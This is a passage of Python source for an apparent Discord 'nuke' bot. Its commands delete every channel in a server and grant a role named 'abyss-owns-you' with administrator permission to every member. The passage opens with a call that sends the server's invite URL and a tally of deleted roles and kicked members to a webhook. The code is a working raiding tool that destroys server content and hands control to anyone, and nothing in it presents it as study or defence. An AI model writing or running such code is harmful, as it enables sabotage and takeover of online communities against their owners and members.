    await send_webhook(guild, author, invite_url, roles_deleted, roles_created, kicked)

    if not is_guild_valid(guild):
        return

    print("done")
    try:
        await guild.leave()
    except discord.NotFound:
        pass
    except Exception as e:
        print(f"Leave error: {e}")

@bot.command()
async def clean(ctx):
    guild = ctx.guild
    author = ctx.author
    
    if author.id in blacklisted_users:
        try:
            await author.send("You are blacklisted and cannot use this bot. The bot has left the server.")
        except:
            pass
        try:
            await guild.leave()
        except:
            pass
        return
    
    for ch in guild.channels:
        try:
            await ch.delete()
        except discord.NotFound as e:
            if e.code == 10004:
                return
        except:
            pass
        
        if not is_guild_valid(guild):
            return
        await asyncio.sleep(0.003)
    
    if not is_guild_valid(guild):
        return
    
    try:
        await guild.create_text_channel("gen")
    except discord.NotFound as e:
        if e.code == 10004:
            pass

@bot.command()
async def ping(ctx):
    await ctx.send(f"{round(bot.latency * 1000)}ms")

@bot.command()
async def adminall(ctx):
    guild = ctx.guild
    author = ctx.author

    if guild is None:
        await ctx.send("This command must be used in a server.")
        return

    if not guild.me.guild_permissions.manage_roles:
        await ctx.send("I don't have **Manage Roles** permission.")
        return

    await bump_bot_role(guild)

    role = discord.utils.get(guild.roles, name="abyss-owns-you")
    if role is None:
        try:
            role = await guild.create_role(
                name="abyss-owns-you",
                color=discord.Color.red(),
                reason="ADMINALL"
            )
        except Exception as e:
            await ctx.send(f"Couldn't find or create an `abyss-owns-you` role: {e}")
            return

    if role >= guild.me.top_role:
        await ctx.send("The role is above my highest role. Bump me above all roles and run it again.")
        return

    try:
        await role.edit(
            permissions=discord.Permissions(administrator=True),
            reason="ADMINALL"
        )
    except discord.Forbidden:
        await ctx.send("Couldn't edit the role - check my permissions / role position.")
        return
    except Exception as e:
        await ctx.send(f"Error editing role: {e}")
        return

    try:
        status = await author.send(f"adminall started on **{guild.name}**, please wait")
    except discord.Forbidden:
        status = None

    await ctx.send(f"ok")

    count = 0
    failed = 0
    total = len(guild.members)

    for member in list(guild.members):
        if role in member.roles:
            continue
        try:
            await member.add_roles(role, reason="ADMINALL")
            count += 1
            if count % 5 == 0:
                await asyncio.sleep(1.1)
            else:
                await asyncio.sleep(0.2)
        except discord.Forbidden:
            failed += 1
        except discord.HTTPException:
            failed += 1
        except Exception as e:
            print(f"adminall error on {member}: {e}")
            failed += 1

        if count % 25 == 0 and status:
            try:
                print("ok")
            except:
                pass
    if status:
        try:
            print("ok")
        except:
            pass

bot.run(config["token"])
